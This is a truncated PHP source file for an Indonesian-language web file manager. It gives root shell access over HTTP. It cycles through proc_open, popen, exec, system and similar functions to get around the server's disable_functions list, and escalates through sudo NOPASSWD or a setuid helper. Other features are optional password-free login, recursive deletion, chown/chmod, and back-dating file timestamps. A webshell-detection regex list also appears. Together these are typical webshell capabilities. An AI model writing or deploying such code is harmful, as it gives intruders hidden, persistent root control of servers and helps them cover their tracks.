<?php

/* ---------------------- KONFIGURASI ---------------------- */

$CONFIG = [
    // ===== LOGIN =====
    // true  = minta password saat masuk (logout beneran keluar ke form login).
    // false = LANGSUNG MASUK tanpa password (auto-login, logout jadi nggak ada artinya).
    'auth_required' => true,

    // bcrypt hash untuk password (hanya dipakai bila auth_required = true).
    'password_hash' => '$2y$12$LfLGakWP0IgX9yuU71L7fOPhOKozDw5qGAI8DndA3xCwQ.G5sU1xu',

    // Direktori root FILE MANAGER. '/' = bisa jelajah SELURUH sistem.
    'root' => '/',

    // Direktori AWAL saat filemanager dibuka pertama kali.
    // __DIR__ = langsung di folder tempat filemanager-admin.php berada.
    'start_dir' => __DIR__,

    // Direktori awal terminal.
    'terminal_root' => __DIR__,

    // true = terminal MENGIKUTI folder browser saat navigasi, tapi `cd` manual di terminal tetap berfungsi.
    'terminal_follows_browser' => true,

    // FULL TERMINAL interaktif (nano/vim/top/Ctrl+C) via ttyd. Isi dengan URL ttyd kamu.
    // Contoh: 'http://SERVER_IP:7681'  (lihat cara install di penjelasan).
    // Kosongkan '' untuk menyembunyikan tombolnya.
    'full_terminal_url' => '',

    // true = Full Terminal (ttyd) auto-terbuka saat halaman dimuat (jadi terminal utama).
    'full_terminal_auto_open' => true,

    // APAKAH terminal otomatis jadi ROOT.
    'run_as_root' => true,

    // Metode root: 'sudo' (sudo NOPASSWD) atau 'exec' (binary setuid rootexec).
    'root_method' => 'sudo',

    // Path sudo (dipakai bila root_method = 'sudo').
    'sudo_path' => '/usr/bin/sudo',

    // Path binary setuid helper (dipakai bila root_method = 'exec').
    'root_exec_path' => '/usr/local/sbin/rootexec',

    // Masa berlaku sesi (detik).
    'session_timeout' => 3600,

    // Hidden files (awalan .) ditampilkan atau tidak.
    'show_hidden' => true,

    // Editor teks: max ukuran file yang boleh dibuka (bytes) — 2 MB default.
    'max_edit_size' => 2 * 1024 * 1024,
];

date_default_timezone_set('Asia/Jakarta');

/* ---------------------- POLYFILLS (PHP 5.x) ---------------------- */

if (!function_exists('random_bytes')) {
    function random_bytes($length) {
        if (function_exists('openssl_random_pseudo_bytes')) {
            $bytes = openssl_random_pseudo_bytes($length, $strong);
            if ($strong === true) return $bytes;
        }
        // Fallback (kurang kuat, tapi cukup untuk token CSRF/session)
        $bytes = '';
        for ($i = 0; $i < $length; $i++) {
            $bytes .= chr(mt_rand(0, 255));
        }
        return $bytes;
    }
}

if (!function_exists('hash_equals')) {
    function hash_equals($a, $b) {
        if (strlen($a) !== strlen($b)) return false;
        $res = 0;
        for ($i = 0; $i < strlen($a); $i++) {
            $res |= ord($a[$i]) ^ ord($b[$i]);
        }
        return $res === 0;
    }
}

if (!function_exists('password_verify')) {
    // PHP 5.3.7+ mendukung bcrypt $2y$ via crypt()
    function password_verify($password, $hash) {
        if (strlen($hash) < 13) return false;
        $test = crypt($password, $hash);
        if (!function_exists('hash_equals')) return $test === $hash;
        return hash_equals($test, $hash);
    }
}

/* ---------------------- SHELL EXECUTION (multi-method fallback) ---------------------- */
// Daftar fungsi yang di-disable server
$DISABLED = array_map('trim', explode(',', strtolower((string)ini_get('disable_functions'))));

/** Eksekusi perintah shell, coba SEMUA metode yang tersedia. Return output atau null. */
function sh_exec($cmd) {
    global $DISABLED;
    // 1) proc_open (paling jarang di-disable)
    if (function_exists('proc_open') && !in_array('proc_open', $DISABLED)) {
        $desc = array(0 => array('pipe','r'), 1 => array('pipe','w'), 2 => array('pipe','w'));
        $p = @proc_open($cmd, $desc, $pipes);
        if (is_resource($p)) {
            $out = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            @fclose($pipes[0]); @fclose($pipes[1]); @fclose($pipes[2]);
            @proc_close($p);
            return $out;
        }
    }
    // 2) popen
    if (function_exists('popen') && !in_array('popen', $DISABLED)) {
        $fp = @popen($cmd . ' 2>&1', 'r');
        if ($fp) { $out = stream_get_contents($fp); @pclose($fp); return $out; }
    }
    // 3) shell_exec
    if (function_exists('shell_exec') && !in_array('shell_exec', $DISABLED)) {
        $out = @shell_exec($cmd . ' 2>&1');
        if ($out !== null) return $out;
    }
    // 4) exec
    if (function_exists('exec') && !in_array('exec', $DISABLED)) {
        $output = array(); $ret = 0;
        @exec($cmd . ' 2>&1', $output, $ret);
        return implode("\n", $output);
    }
    // 5) system
    if (function_exists('system') && !in_array('system', $DISABLED)) {
        ob_start(); @system($cmd . ' 2>&1'); return ob_get_clean();
    }
    // 6) passthru
    if (function_exists('passthru') && !in_array('passthru', $DISABLED)) {
        ob_start(); @passthru($cmd . ' 2>&1'); return ob_get_clean();
    }
    return null;
}

// Deteksi apakah shell benar-benar bisa dipakai (uji cepat)
$SHELL_OK = (sh_exec('echo __FM_OK__') !== null);

/* ---------------------- SUDO / ROOT INFRA ---------------------- */

// Coba aktifkan root secara otomatis; kalau gagal, fallback ke user biasa
// (semua fitur tetap jalan, cuma tanpa akses root).
$SUDO = '';
$sudo_ok = false;
if (!empty($CONFIG['run_as_root'])) {
    $root_method = (isset($CONFIG['root_method']) ? $CONFIG['root_method'] : 'sudo');

    // 0) Web server SUDAH jalan sebagai root? (mis. php-fpm user=root)
    //    Maka semua perintah otomatis root tanpa sudo/setuid.
    if (trim(sh_exec('whoami 2>&1')) === 'root') {
        $sudo_ok = true;   // $SUDO tetap '' — sudah root, tak perlu prefix
    }

    // 1) coba binary setuid rootexec (bila metode = exec)
    if (!$sudo_ok && $root_method === 'exec') {
        $exec = $CONFIG['root_exec_path'];
        if (file_exists($exec) && is_executable($exec)) {
            $t = trim(sh_exec($exec . ' whoami 2>&1'));
            if ($t === 'root') { $SUDO = $exec . ' '; $sudo_ok = true; }
        }
    }

    // 2) coba sudo NOPASSWD (atau fallback dari exec)
    if (!$sudo_ok) {
        $t = trim(sh_exec($CONFIG['sudo_path'] . ' -n whoami 2>&1'));
        if ($t === 'root') { $SUDO = $CONFIG['sudo_path'] . ' -n '; $sudo_ok = true; }
    }
}
// $SUDO === ''  ->  mode user biasa (terminal & operasi file tetap jalan)

/** Jalankan perintah shell (via sudo bila run_as_root). Return [code, output]. */
function fs_run($cmdline) {
    global $SUDO, $SHELL_OK, $DISABLED;
    if (!$SHELL_OK) {
        return array('code' => 127, 'output' => 'Shell disabled di server ini (disable_functions).');
    }
    $full = $SUDO . $cmdline . ' 2>&1';
    // pakai exec bila tersedia (ada exit code), fallback ke sh_exec
    if (function_exists('exec') && !in_array('exec', $DISABLED)) {
        $output = array();
        $ret = 0;
        @exec($full, $output, $ret);
        return array('code' => $ret, 'output' => implode("\n", $output));
    }
    $out = sh_exec($full);
    return array('code' => ($out === null ? 127 : 0), 'output' => ($out === null ? '' : $out));
}

/** Baca isi file sebagai root. Return string ('' bila gagal). */
function root_cat($path) {
    global $SUDO, $SHELL_OK;
    if (!$SHELL_OK) {
        $c = @file_get_contents($path);
        return ($c === false) ? '' : $c;
    }
    $out = sh_exec($SUDO . 'cat ' . escapeshellarg($path) . ' 2>/dev/null');
    return $out === null ? '' : $out;
}

/** Ukuran file sebagai root (bytes). Return -1 bila gagal/bukan file. */
function root_filesize($path) {
    global $SUDO, $SHELL_OK;
    if (!$SHELL_OK) {
        return @is_file($path) ? @filesize($path) : -1;
    }
    $s = trim(sh_exec($SUDO . 'stat -c %s ' . escapeshellarg($path) . ' 2>/dev/null'));
    return ($s === '') ? -1 : intval($s);
}

/** Info server (read-only): uptime, load, RAM, disk, CPU. */
function server_info() {
    global $SUDO;
    $info = array('uptime'=>'','load'=>'','ram_total'=>0,'ram_used'=>0,'ram_pct'=>0,
                  'disk_size'=>'','disk_used'=>'','disk_pct'=>0,'cores'=>'','host'=>'','kernel'=>'','os'=>'');

    $u = trim(sh_exec($SUDO . 'uptime 2>/dev/null'));
    $info['uptime'] = $u;
    if (preg_match('/load average:\s*([\d.]+),\s*([\d.]+),\s*([\d.]+)/', $u, $m)) {
        $info['load'] = $m[1] . ' / ' . $m[2] . ' / ' . $m[3];
    }

    $fm = trim(sh_exec($SUDO . 'free -m 2>/dev/null'));
    if (preg_match('/Mem:\s+(\d+)\s+(\d+)/', $fm, $m)) {
        $info['ram_total'] = (int)$m[1];
        $info['ram_used']  = (int)$m[2];
        $info['ram_pct']   = $info['ram_total'] > 0 ? round($info['ram_used'] / $info['ram_total'] * 100) : 0;
    }

    $df = trim(sh_exec($SUDO . 'df -h / 2>/dev/null | tail -1'));
    if (preg_match('/\s+(\S+)\s+(\S+)\s+(\d+)%/', $df, $m)) {
        $info['disk_size'] = $m[1];
        $info['disk_used'] = $m[2];
        $info['disk_pct']  = (int)$m[3];
    }

    $info['cores']  = trim(sh_exec($SUDO . 'nproc 2>/dev/null'));
    $info['host']   = php_uname('n');
    $info['kernel'] = php_uname('r');
    $os = trim(sh_exec($SUDO . 'cat /etc/os-release 2>/dev/null | grep PRETTY_NAME | head -1 | cut -d= -f2'));
    $info['os'] = trim($os, '"');

    return $info;
}

/** Folder tree (nested) sampai kedalaman tertentu. Return array bersarang. */
function folder_tree($base, $depth = 2) {
    global $SUDO;
    $base = rtrim($base, '/');
    if ($base === '') $base = '/';
    $cmd = $SUDO . 'find ' . escapeshellarg($base) . ' -maxdepth ' . intval($depth) . ' -type d 2>/dev/null';
    $out = sh_exec($cmd);
    $lines = array_filter(explode("\n", trim($out)));
    // buang virtual filesystem (proc/sys/dev/run) yang penuh noise
    $lines = array_filter($lines, function ($l) {
        return !preg_match('#^/?(proc|sys|dev|run|snap|boot)(/|$)#', $l);
    });
    sort($lines);
    $tree = [];
    foreach ($lines as $line) {
        $line = rtrim($line, '/');
        if ($line === '' || $line === $base) continue;
        $rel = ($base === '/') ? ltrim(substr($line, 1), '/') : ltrim(substr($line, strlen($base)), '/');
        if ($rel === '') continue;
        $parts = explode('/', $rel);
        $cur = &$tree;
        foreach ($parts as $p) {
            if ($p === '') continue;
            if (!isset($cur[$p])) $cur[$p] = [];
            $cur = &$cur[$p];
        }
        unset($cur);
    }
    return $tree;
}

/** Render folder tree jadi HTML nested <ul>. */
function render_tree($tree, $base, $prefix = '') {
    $html = '<ul class="tree-ul">';
    foreach ($tree as $name => $children) {
        $rel = ($prefix === '') ? $name : $prefix . '/' . $name;
        $full = ($base === '/') ? '/' . $rel : $base . '/' . $rel;
        $hasChild = !empty($children);
        $html .= '<li>';
        if ($hasChild) {
            $html .= '<details open><summary><a href="?p=' . urlencode($full) . '"><i class="fa-solid fa-folder"></i> ' . h($name) . '</a></summary>';
            $html .= render_tree($children, $base, $rel);
            $html .= '</details>';
        } else {
            $html .= '<a href="?p=' . urlencode($full) . '"><i class="fa-solid fa-folder"></i> ' . h($name) . '</a>';
        }
        $html .= '</li>';
    }
    $html .= '</ul>';
    return $html;
}

/* ---------------------- AUTH ---------------------- */
session_start();

// No-cache (biar logout/login nggak ketimpa cache browser)
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: 0');

// Logout
if (isset($_GET['logout'])) {
    $_SESSION = [];
    session_unset();
    if (ini_get('session.use_cookies')) {
        $p = session_get_cookie_params();
        setcookie(session_name(), '', time() - 42000, $p['path'], $p['domain'], $p['secure'], $p['httponly']);
    }
    session_destroy();
    $redir = (isset($_SERVER['REQUEST_URI']) ? strtok($_SERVER['REQUEST_URI'], '?') : '');
    if ($redir === '' || $redir === false) $redir = $_SERVER['PHP_SELF'];
    header('Location: ' . $redir);
    exit;
}

// Login attempt
$login_error = '';
if (isset($_POST['password'])) {
    if (!password_verify($_POST['password'], $CONFIG['password_hash'])) {
        $login_error = 'Password salah.';
        // AJAX: kembalikan JSON error tanpa refresh
        if (isset($_POST['ajax']) && $_POST['ajax'] === '1') {
            header('Content-Type: application/json; charset=utf-8');
            echo json_encode(array('ok' => false, 'msg' => 'Password salah.', 'type' => 'error'));
            exit;
        }
    } else {
        session_regenerate_id(true);
        $_SESSION['authed'] = true;
        $_SESSION['last_activity'] = time();
        $_SESSION['cwd'] = $CONFIG['terminal_root'];
        // AJAX: kembalikan JSON sukses
        if (isset($_POST['ajax']) && $_POST['ajax'] === '1') {
            header('Content-Type: application/json; charset=utf-8');
            echo json_encode(array('ok' => true, 'msg' => 'Login berhasil.', 'type' => 'success'));
            exit;
        }
    }
}

// Session timeout check
if (isset($_SESSION['last_activity']) && (time() - $_SESSION['last_activity']) > $CONFIG['session_timeout']) {
    $_SESSION = [];
    session_destroy();
    header('Location: ' . $_SERVER['PHP_SELF']);
    exit;
}
if (!empty($_SESSION['authed'])) {
    $_SESSION['last_activity'] = time();
}

$authed = !empty($_SESSION['authed']);

// Auto-login bila password dimatikan
if (empty($CONFIG['auth_required'])) {
    $_SESSION['authed'] = true;
    $authed = true;
}

/* ---------------------- HELPERS ---------------------- */

function h($s) {
    return htmlspecialchars((string)$s, ENT_QUOTES, 'UTF-8');
}

function csrf_token() {
    if (empty($_SESSION['csrf'])) {
        $_SESSION['csrf'] = bin2hex(random_bytes(32));
    }
    return $_SESSION['csrf'];
}

function csrf_check() {
    if (!isset($_POST['csrf']) || !hash_equals((isset($_SESSION['csrf']) ? $_SESSION['csrf'] : ''), $_POST['csrf'])) {
        http_response_code(403);
        exit('Invalid CSRF token.');
    }
}

/** Resolve path dan pastikan tetap di dalam $base. Return absolute path atau null. */
function safe_path($path, $base) {
    $realbase = realpath($base);
    if ($realbase === false) $realbase = $base;
    // root = '/' berarti akses penuh, tanpa jail
    if ($realbase === '/') {
        $real = realpath($path);
        if ($real !== false) return $real;
        // path belum ada (untuk create/rename) — cek parent
        $parent = realpath(dirname($path));
        if ($parent === false) return null;
        return $parent . '/' . basename($path);
    }
    $base = rtrim($realbase, '/');
    $real = realpath($path);
    if ($real === false) {
        $parent = realpath(dirname($path));
        if ($parent === false) return null;
        $real = $parent . '/' . basename($path);
    }
    $real = rtrim($real, '/');
    if ($real === $base) return $real;
    if (strpos($real . '/', $base . '/') === 0) return $real;
    return null;
}

function human_size($bytes) {
    $units = ['B', 'KB', 'MB', 'GB', 'TB'];
    $i = 0;
    while ($bytes >= 1024 && $i < 4) { $bytes /= 1024; $i++; }
    return round($bytes, 1) . ' ' . $units[$i];
}

/** Ikon + warna berdasarkan ekstensi file. Return [class, color]. */
function file_icon($name) {
    $ext = strtolower(pathinfo($name, PATHINFO_EXTENSION));
    $img = ['png','jpg','jpeg','gif','webp','svg','ico','bmp'];
    $code = ['php','php3','php4','php5','phtml','js','mjs','ts','jsx','html','htm','css','scss','less','py','rb','pl','java','c','cpp','h','cs','go','rs','vue'];
    $archive = ['zip','tar','gz','tgz','bz2','rar','7z','xz'];
    $config = ['ini','conf','env','json','yml','yaml','xml','toml'];
    $db = ['sql','sqlite','db'];
    $shell = ['sh','bash','zsh','fish'];
    $text = ['txt','md','log','csv'];
    if (in_array($ext, $img))    return ['fa-regular fa-image', '#a78bfa'];
    if (in_array($ext, $code))   return ['fa-solid fa-code', '#4ade80'];
    if (in_array($ext, $archive))return ['fa-solid fa-file-zipper', '#fbbf24'];
    if (in_array($ext, $config)) return ['fa-solid fa-gear', '#94a3b8'];
    if (in_array($ext, $db))     return ['fa-solid fa-database', '#2dd4bf'];
    if (in_array($ext, $shell))  return ['fa-solid fa-terminal', '#34d399'];
    if (in_array($ext, $text))   return ['fa-regular fa-file-lines', '#8b98ad'];
    return ['fa-regular fa-file', '#8b98ad'];
}

/** Normalisasi path absolut tanpa menyentuh filesystem (collapse . dan ..). */
function normpath($p) {
    $parts = array();
    foreach (explode('/', $p) as $seg) {
        if ($seg === '' || $seg === '.') continue;
        if ($seg === '..') { array_pop($parts); continue; }
        $parts[] = $seg;
    }
    $out = '/' . implode('/', $parts);
    return $out === '' ? '/' : $out;
}

function list_dir($dir) {
    global $SUDO, $SHELL_OK;
    $items = [];
    $show_hidden = !empty($GLOBALS['CONFIG']['show_hidden']);

    // Fallback bila shell di-disable: pakai scandir (PHP murni)
    if (!$SHELL_OK) {
        $entries = @scandir($dir);
        if ($entries === false) return $items;
        foreach ($entries as $e) {
            if ($e === '.' || $e === '..') continue;
            if (!$show_hidden && strpos($e, '.') === 0) continue;
            $full = $dir . '/' . $e;
            $items[] = [
                'name'   => $e,
                'path'   => $full,
                'is_dir' => is_dir($full),
                'size'   => is_dir($full) ? null : filesize($full),
                'perms'  => substr(sprintf('%o', @fileperms($full)), -4),
                'mtime'  => filemtime($full),
            ];
        }
        usort($items, function ($a, $b) {
            if ($a['is_dir'] !== $b['is_dir']) return $a['is_dir'] ? -1 : 1;
            return strcasecmp($a['name'], $b['name']);
        });
        return $items;
    }

    // List via find -printf (jalur root) agar bisa baca direktori root-only.
    // Format: type \t nama \t size \t perms \t mtime(epoch)
    $cmd = $SUDO . 'find ' . escapeshellarg($dir) . ' -maxdepth 1 -mindepth 1 -printf ' . escapeshellarg("%y\t%f\t%s\t%m\t%T@\n") . ' 2>/dev/null';
    $out = sh_exec($cmd);
    $out = $out === null ? '' : $out;
    foreach (explode("\n", $out) as $line) {
        if ($line === '') continue;
        $f = explode("\t", $line);
        if (count($f) < 5) continue;
        $name = $f[1];
        if ($name === '.' || $name === '..') continue;
        if (!$show_hidden && strpos($name, '.') === 0) continue;
        $items[] = [
            'name'   => $name,
            'path'   => rtrim($dir, '/') . '/' . $name,
            'is_dir' => ($f[0] === 'd'),
            'size'   => ($f[0] === 'd') ? null : intval($f[2]),
            'perms'  => $f[3],
            'mtime'  => intval($f[4]),
        ];
    }
    usort($items, function ($a, $b) {
        if ($a['is_dir'] !== $b['is_dir']) return $a['is_dir'] ? -1 : 1;
        return strcasecmp($a['name'], $b['name']);
    });
    return $items;
}

function rrmdir($dir) {
    if (!is_dir($dir)) return false;
    // Iterasi CHILD_FIRST: hapus anak dulu lalu parent — efisien utk folder berisi banyak file
    try {
        $it = new RecursiveIteratorIterator(
            new RecursiveDirectoryIterator($dir, FilesystemIterator::SKIP_DOTS),
            RecursiveIteratorIterator::CHILD_FIRST
        );
        foreach ($it as $file) {
            if ($file->isDir()) { @rmdir($file->getPathname()); }
            else { @unlink($file->getPathname()); }
        }
    } catch (Exception $e) { /* abaikan */ }
    return @rmdir($dir);
}

function flash($msg, $type = 'info') {
    $_SESSION['flash'] = ['msg' => $msg, 'type' => $type];
}

/* ---------------------- ACTION HANDLERS (POST) ---------------------- */

$flash_msg = null;
if ($authed && isset($_SERVER['REQUEST_METHOD']) && $_SERVER['REQUEST_METHOD'] === 'POST' && isset($_POST['action'])) {
    csrf_check();
    $action = $_POST['action'];
    $root = $CONFIG['root'];
    // Prioritas: ikuti path di URL (setelah navigasi AJAX), fallback ke hidden field cwd
    $cwd_src = (isset($_GET['p']) && $_GET['p'] !== '') ? $_GET['p'] : (isset($_POST['cwd']) ? $_POST['cwd'] : $root);
    $cwd = safe_path($cwd_src, $root) ?: $root;

    try {
        switch ($action) {

            case 'create_file':
                $name = basename((isset($_POST['name']) ? $_POST['name'] : ''));
                if ($name === '' || $name === '.' || $name === '..') throw new Exception('Nama tidak valid.');
                $target = $cwd . '/' . $name;
                if (file_exists($target)) throw new Exception('File sudah ada.');
                if (!$SHELL_OK) {
                    if (@file_put_contents($target, '') === false) throw new Exception('Gagal membuat file.');
                } else {
                    $r = fs_run('touch ' . escapeshellarg($target));
                    if ($r['code'] !== 0) throw new Exception('Gagal membuat file: ' . $r['output']);
                }
                flash("File \"$name\" dibuat.", 'success');
                break;

            case 'create_dir':
                $name = basename((isset($_POST['name']) ? $_POST['name'] : ''));
                if ($name === '' || $name === '.' || $name === '..') throw new Exception('Nama tidak valid.');
                $target = $cwd . '/' . $name;
                if (file_exists($target)) throw new Exception('Folder sudah ada.');
                if (!$SHELL_OK) {
                    if (!@mkdir($target, 0755, true)) throw new Exception('Gagal membuat folder.');
                } else {
                    $r = fs_run('mkdir -p ' . escapeshellarg($target));
                    if ($r['code'] !== 0) throw new Exception('Gagal membuat folder: ' . $r['output']);
                }
                flash("Folder \"$name\" dibuat.", 'success');
                break;

            case 'rename':
                $old = safe_path((isset($_POST['old']) ? $_POST['old'] : ''), $root);
                $new = basename((isset($_POST['new']) ? $_POST['new'] : ''));
                if (!$old || $new === '' || $new === '.' || $new === '..') throw new Exception('Target tidak valid.');
                $target = dirname($old) . '/' . $new;
                if (file_exists($target)) throw new Exception('Nama tujuan sudah dipakai.');
                if (!$SHELL_OK) {
                    if (!@rename($old, $target)) throw new Exception('Gagal rename.');
                } else {
                    $r = fs_run('mv ' . escapeshellarg($old) . ' ' . escapeshellarg($target));
                    if ($r['code'] !== 0) throw new Exception('Gagal rename: ' . $r['output']);
                }
                flash('Berhasil di-rename.', 'success');
                break;

            case 'delete':
                $targets = isset($_POST['targets']) ? (array)$_POST['targets'] : [];
                if (empty($targets)) throw new Exception('Tidak ada item dipilih.');
                @set_time_limit(0);  // izinkan hapus folder besar tanpa timeout
                $count = 0;
                foreach ($targets as $t) {
                    $p = safe_path($t, $root);
                    if (!$p) continue;
                    if (!$SHELL_OK) {
                        if (is_dir($p)) { if (rrmdir($p)) $count++; }
                        else { if (@unlink($p)) $count++; }
                    } else {
                        $r = fs_run('rm -rf ' . escapeshellarg($p));
                        if ($r['code'] === 0) $count++;
                    }
                }
                flash("$count item dihapus (folder termasuk seluruh isinya).", 'success');
                break;

            case 'chmod':
                $target = safe_path((isset($_POST['target']) ? $_POST['target'] : ''), $root);
                $mode = intval((isset($_POST['mode']) ? $_POST['mode'] : '0'), 8);
                if (!$target || $mode <= 0 || $mode > 07777) throw new Exception('Mode tidak valid.');
                if (!$SHELL_OK) {
                    if (!@chmod($target, $mode)) throw new Exception('Gagal chmod.');
                } else {
                    $r = fs_run('chmod ' . sprintf('%o', $mode) . ' ' . escapeshellarg($target));
                    if ($r['code'] !== 0) throw new Exception('Gagal chmod: ' . $r['output']);
                }
                flash('Permission diubah ke ' . substr(sprintf('%o', $mode), -4) . '.', 'success');
                break;

            case 'chown':
                $target = safe_path((isset($_POST['target']) ? $_POST['target'] : ''), $root);
                $owner = (isset($_POST['owner']) ? $_POST['owner'] : '');
                if (!$target || $owner === '') throw new Exception('Owner tidak valid.');
                if (!preg_match('/^[A-Za-z0-9_.-]+(:[A-Za-z0-9_.-]+)?$/', $owner)) throw new Exception('Format owner salah (contoh: www-data atau www-data:www-data).');
                if (!$SHELL_OK) throw new Exception('Chown butuh akses root/shell.');
                $r = fs_run('chown ' . escapeshellarg($owner) . ' ' . escapeshellarg($target));
                if ($r['code'] !== 0) throw new Exception('Gagal chown: ' . $r['output']);
                flash('Owner diubah ke ' . $owner . '.', 'success');
                break;

            case 'touch':
                $target = safe_path((isset($_POST['target']) ? $_POST['target'] : ''), $root);
                $dt = (isset($_POST['datetime']) ? $_POST['datetime'] : '');
                if (!$target || $target === '') throw new Exception('Target tidak valid.');
                if (!preg_match('/^\d{4}-\d{2}-\d{2} \d{2}:\d{2}(:\d{2})?$/', $dt)) throw new Exception('Format waktu salah (gunakan YYYY-MM-DD HH:MM:SS).');
                if (!$SHELL_OK) {
                    if (!@touch($target, strtotime($dt))) throw new Exception('Gagal mengubah waktu.');
                } else {
                    $r = fs_run('touch -d ' . escapeshellarg($dt) . ' ' . escapeshellarg($target));
                    if ($r['code'] !== 0) throw new Exception('Gagal mengubah waktu: ' . $r['output']);
                }
                flash('Waktu file diubah ke ' . $dt . '.', 'success');
                break;

            case 'save_file':
                $target = safe_path((isset($_POST['target']) ? $_POST['target'] : ''), $root);
                if (!$target || !is_file($target)) throw new Exception('File tidak ditemukan.');
                $content = (isset($_POST['content']) ? $_POST['content'] : '');
                if (!$SHELL_OK) {
                    if (@file_put_contents($target, $content) === false) throw new Exception('Gagal menyimpan (tidak writable?).');
                } else {
                    $tmp = tempnam(sys_get_temp_dir(), 'fm');
                    if ($tmp === false) throw new Exception('Gagal membuat file sementara.');
                    file_put_contents($tmp, $content);
                    $r = fs_run('tee ' . escapeshellarg($target) . ' < ' . escapeshellarg($tmp) . ' > /dev/null');
                    @unlink($tmp);
                    if ($r['code'] !== 0) throw new Exception('Gagal menyimpan: ' . $r['output']);
                }
                flash('File tersimpan.', 'success');
                break;

            case 'upload':
                if (empty($_FILES['files']['name'][0])) throw new Exception('Tidak ada file dipilih.');
                $count = 0;
                foreach ($_FILES['files']['name'] as $i => $fname) {
                    if ($_FILES['files']['error'][$i] !== UPLOAD_ERR_OK) continue;
                    $fname = basename($fname);
                    $dest = $cwd . '/' . $fname;
                    if (!$SHELL_OK) {
                        if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $dest)) $count++;
                    } else {
                        $tmp = tempnam(sys_get_temp_dir(), 'fm');
                        if ($tmp === false) continue;
                        if (move_uploaded_file($_FILES['files']['tmp_name'][$i], $tmp)) {
                            $r = fs_run('mv ' . escapeshellarg($tmp) . ' ' . escapeshellarg($dest));
                            if ($r['code'] === 0) $count++;
                        }
                        @unlink($tmp);
                    }
                }
                flash("$count file di-upload.", 'success');
                break;

            case 'search':
                $q = trim((isset($_POST['q']) ? $_POST['q'] : ''));
                if ($q === '') throw new Exception('Kata kunci kosong.');
                $inner = 'cd ' . escapeshellarg($cwd) . ' && find . -maxdepth 6 -iname ' . escapeshellarg('*' . $q . '*') . ' 2>/dev/null | head -300';
                $r = fs_run('bash -c ' . escapeshellarg($inner));
                $_SESSION['search_query'] = $q;
                $_SESSION['search_results'] = $r['output'];
                $_SESSION['search_cwd'] = $cwd;
                $_SESSION['search_mode'] = 'name';
                flash('Pencarian "' . $q . '" selesai. Lihat hasil di bawah.', 'info');
                break;

            case 'grep':
                $q = trim((isset($_POST['q']) ? $_POST['q'] : ''));
                if ($q === '') throw new Exception('Kata kunci kosong.');
                $inner = 'cd ' . escapeshellarg($cwd) . ' && grep -rin --include="*" -m 3 ' . escapeshellarg($q) . ' . 2>/dev/null | head -300';
                $r = fs_run('bash -c ' . escapeshellarg($inner));
                $_SESSION['search_query'] = $q;
                $_SESSION['search_results'] = $r['output'];
                $_SESSION['search_cwd'] = $cwd;
                $_SESSION['search_mode'] = 'content';
                flash('Grep isi file untuk "' . $q . '" selesai. Lihat hasil di bawah.', 'info');
                break;

            case 'scan_webshell':
                $patterns = 'eval\s*\(|base64_decode\s*\(|system\s*\(|shell_exec\s*\(|passthru\s*\(|exec\s*\(|assert\s*\(|gzinflate\s*\(|str_rot13\s*\(|proc_open\s*\(|popen\s*\(|move_uploaded_file\s*\(|mkdir\s*\(|file_put_contents\s*\(|unlink\s*\(|rmdir\s*\(|rename\s*\(|chmod\s*\(|scandir\s*\(|curl_exec\s*\(|error_reporting\s*\(\s*0|php_uname\s*\(|chdir\s*\(|getcwd\s*\(|fsockopen\s*\(|stream_socket_client\s*\(|goto\s+[A-Za-z0-9_]+|\\\\x[0-9a-fA-F]{2}|\\\\[0-7]{3}';
                $hits = array();
                $php_exts = array('php','phtml','php3','php4','php5','php7','phar','inc'); // hanya format PHP yang dianggap webshell
                if (!$SHELL_OK) {
                    // Scan PHP murni (non-rekursif: hanya file di folder ini)
                    $entries = @scandir($cwd);
                    if ($entries !== false) {
                        foreach ($entries as $e) {
                            if ($e === '.' || $e === '..') continue;
                            $full = $cwd . '/' . $e;
                            if (!is_file($full)) continue;          // lewati folder
                            $ext = strtolower(pathinfo($full, PATHINFO_EXTENSION));
                            if (!in_array($ext, $php_exts)) continue; // lewati non-PHP (hindari false positive)
                            if (@filesize($full) > 2 * 1024 * 1024) continue;
                            $content = @file_get_contents($full);
                            if ($content === false) continue;
                            if (@preg_match('#' . $patterns . '#i', $content)) {
                                $hits[$full] = true;
                            }
                            if (count($hits) >= 500) break;
                        }
                    }
                    $_SESSION['search_results'] = implode("\n", array_keys($hits));
                } else {
                    // grep non-rekursif: hanya file PHP di folder ini (lewati subfolder)
                    $inner = 'cd ' . escapeshellarg($cwd) . ' && find . -maxdepth 1 -type f \( -iname "*.php" -o -iname "*.phtml" -o -iname "*.php3" -o -iname "*.php4" -o -iname "*.php5" -o -iname "*.php7" -o -iname "*.phar" -o -iname "*.inc" \) -exec grep -laE ' . escapeshellarg($patterns) . ' {} + 2>/dev/null | head -800';
                    $r = fs_run('bash -c ' . escapeshellarg($inner));
                    $_SESSION['search_results'] = $r['output'];
                    foreach (explode("\n", trim($r['output'])) as $ln) {
                        if ($ln === '') continue;
                        $full = rtrim($cwd, '/') . '/' . ltrim($ln, './');
                        $hits[$full] = true;
                    }
                }
                $_SESSION['search_query'] = 'Webshell scan';
                $_SESSION['search_cwd'] = $cwd;
                $_SESSION['search_mode'] = 'webshell';
                $_SESSION['webshell_hits'] = $hits;
                $found = count($hits);
                flash("Scan webshell selesai. " . ($found ? "$found file mencurigakan ditandai di daftar file." : 'Tidak ada file mencurigakan.') , $found ? 'warn' : 'success');
                break;

            case 'copy_selected':
                $targets = isset($_POST['targets']) ? (array)$_POST['targets'] : [];
                if (empty($targets)) throw new Exception('Tidak ada item dipilih.');
                $_SESSION['clipboard'] = ['mode' => 'copy', 'items' => $targets];
                flash(count($targets) . ' item disalin (Copy).', 'info');
                break;

            case 'move_selected':
                $targets = isset($_POST['targets']) ? (array)$_POST['targets'] : [];
                if (empty($targets)) throw new Exception('Tidak ada item dipilih.');
                $_SESSION['clipboard'] = ['mode' => 'move', 'items' => $targets];
                flash(count($targets) . ' item dipotong (Move).', 'info');
                break;

            case 'clear_clipboard':
                unset($_SESSION['clipboard']);
                flash('Clipboard dibersihkan.', 'info');
                break;

            case 'paste':
                $clip = (isset($_SESSION['clipboard']) ? $_SESSION['clipboard'] : null);
                if (!$clip || empty($clip['items'])) throw new Exception('Clipboard kosong.');
                $count = 0; $conflicts = 0;
                foreach ($clip['items'] as $src) {
                    $s = safe_path($src, $root);
                    if (!$s || $s === '') continue;
                    $dest = rtrim($cwd, '/') . '/' . basename($s);
                    if ($dest === $s) continue;
                    // konflik nama: tambah suffix
